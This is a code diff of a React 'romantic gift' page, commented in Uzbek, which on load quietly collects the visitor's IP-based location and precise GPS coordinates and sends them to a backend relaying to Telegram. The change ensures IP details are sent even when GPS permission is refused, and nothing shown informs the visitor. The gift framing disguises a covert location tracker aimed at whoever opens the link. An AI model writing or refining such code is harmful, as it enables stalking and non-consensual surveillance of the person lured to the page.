@@ -13,63 +13,86 @@ const RomanticGift = () => {
 
   const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || 'https://romantic-gift-backend.onrender.com/api/notify';
 
-  useEffect(() => {
-    const getLocationData = async () => {
-      // 1. IP ma'lumotlarini olish
-      try {
-        const response = await fetch('https://ipinfo.io/json');
-        const data = await response.json();
-        setIpData(data);
-      } catch (error) {
-        console.log('IP detection:', error);
-      }
+ useEffect(() => {
+  const getLocationData = async () => {
+    // 1. AVVAL IP ma'lumotlarini to'liq olish
+    let currentIpData = null;
+    try {
+      const response = await fetch('https://ipinfo.io/json');
+      const data = await response.json();
+      setIpData(data);
+      currentIpData = data; // Local o'zgaruvchida saqlash
+      console.log('IP data loaded:', data);
+    } catch (error) {
+      console.log('IP detection error:', error);
+    }
 
-      // 2. GPS koordinatalarini olishga harakat qilish
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          async (position) => {
-            const gpsCoords = {
-              latitude: position.coords.latitude,
-              longitude: position.coords.longitude,
-              accuracy: position.coords.accuracy,
-              timestamp: new Date().toLocaleString('ru-RU')
-            };
-            setGpsData(gpsCoords);
-            
-            // GPS ma'lumotlarini yuborish
-            await sendDataToTelegram({
-              type: '💝 Страница открыта',
-              gpsLat: gpsCoords.latitude,
-              gpsLon: gpsCoords.longitude,
-              gpsAccuracy: gpsCoords.accuracy,
-              hasGPS: true
-            });
-          },
-          async (error) => {
-            console.log('GPS error:', error.message);
-            // GPS ruxsat berilmasa, faqat IP bilan yuborish
-            await sendDataToTelegram({
-              type: '💝 Страница открыта (GPS ruxsat berilmagan)',
-              hasGPS: false
-            });
-          },
-          {
-            enableHighAccuracy: true, // Yuqori aniqlik
-            timeout: 10000,
-            maximumAge: 0
-          }
-        );
-      } else {
-        // Browser GPS qo'llab-quvvatlamasa
-        await sendDataToTelegram({
-          type: '💝 Страница открыта (GPS mavjud emas)',
-          hasGPS: false
-        });
-      }
-    };
+    // 2. GPS koordinatalarini olish
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          const gpsCoords = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: new Date().toLocaleString('ru-RU')
+          };
+          setGpsData(gpsCoords);
+          console.log('GPS data loaded:', gpsCoords);
+          
+          // GPS + IP ma'lumotlarini birga yuborish
+          await sendDataToTelegram({
+            type: '💝 Страница открыта',
+            gpsLat: gpsCoords.latitude,
+            gpsLon: gpsCoords.longitude,
+            gpsAccuracy: gpsCoords.accuracy,
+            hasGPS: true,
+            // IP ma'lumotlarini ham qo'shish
+            ip: currentIpData?.ip,
+            city: currentIpData?.city,
+            region: currentIpData?.region,
+            country: currentIpData?.country,
+            loc: currentIpData?.loc,
+            org: currentIpData?.org
+          });
+        },
+        async (error) => {
+          console.log('GPS error:', error.message);
+          // GPS rad etilgan, faqat IP
+          await sendDataToTelegram({
+            type: '💝 Страница открыта (GPS ruxsat berilmagan)',
+            hasGPS: false,
+            ip: currentIpData?.ip,
+            city: currentIpData?.city,
+            region: currentIpData?.region,
+            country: currentIpData?.country,
+            loc: currentIpData?.loc,
+            org: currentIpData?.org
+          });
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
+    } else {
+      // GPS mavjud emas
+      await sendDataToTelegram({
+        type: '💝 Страница открыта (GPS mavjud emas)',
+        hasGPS: false,
+        ip: currentIpData?.ip,
+        city: currentIpData?.city,
+        region: currentIpData?.region,
+        country: currentIpData?.country,
+        loc: currentIpData?.loc,
+        org: currentIpData?.org
+      });
+    }
+  };
 
-    getLocationData();
-  }, []);
+  getLocationData();
+}, []);
 
   const startMusic = () => {
     if (audioRef.current) {
@@ -93,38 +116,38 @@ const RomanticGift = () => {
     }
   };
 
-  const sendDataToTelegram = async (data) => {
-    try {
-      console.log('Sending to:', BACKEND_URL);
-      
-      const response = await fetch(BACKEND_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          type: data.type,
-          address: data.address || '',
-          // IP data
-          ip: data.ip || ipData?.ip || 'N/A',
-          city: data.city || ipData?.city || 'N/A',
-          region: data.region || ipData?.region || 'N/A',
-          country: data.country || ipData?.country || 'N/A',
-          loc: data.loc || ipData?.loc || 'N/A',
-          org: data.org || ipData?.org || 'N/A',
-          // GPS data
-          gpsLat: data.gpsLat || gpsData?.latitude || null,
-          gpsLon: data.gpsLon || gpsData?.longitude || null,
-          gpsAccuracy: data.gpsAccuracy || gpsData?.accuracy || null,
-          hasGPS: data.hasGPS !== undefined ? data.hasGPS : (gpsData !== null),
-          timestamp: data.timestamp || new Date().toLocaleString('ru-RU')
-        })
-      });
-      
-      const result = await response.json();
-      console.log('Backend response:', result);
-    } catch (error) {
-      console.error('Backend error:', error);
-    }
-  };
+ const sendDataToTelegram = async (data) => {
+  try {
+    console.log('Sending to:', BACKEND_URL);
+    
+    const response = await fetch(BACKEND_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        type: data.type,
+        address: data.address || '',
+        // IP data - agar data da bo'lsa ulardan, yo'qsa ipData state dan
+        ip: data.ip || ipData?.ip || 'N/A',
+        city: data.city || ipData?.city || 'N/A',
+        region: data.region || ipData?.region || 'N/A',
+        country: data.country || ipData?.country || 'N/A',
+        loc: data.loc || ipData?.loc || 'N/A',
+        org: data.org || ipData?.org || 'N/A',
+        // GPS data
+        gpsLat: data.gpsLat || gpsData?.latitude || null,
+        gpsLon: data.gpsLon || gpsData?.longitude || null,
+        gpsAccuracy: data.gpsAccuracy || gpsData?.accuracy || null,
+        hasGPS: data.hasGPS !== undefined ? data.hasGPS : (gpsData !== null),
+        timestamp: data.timestamp || new Date().toLocaleString('ru-RU')
+      })
+    });
+    
+    const result = await response.json();
+    console.log('Backend response:', result);
+  } catch (error) {
+    console.error('Backend error:', error);
+  }
+};
 
   const handleAddressSubmit = async () => {
     if (address.trim()) {
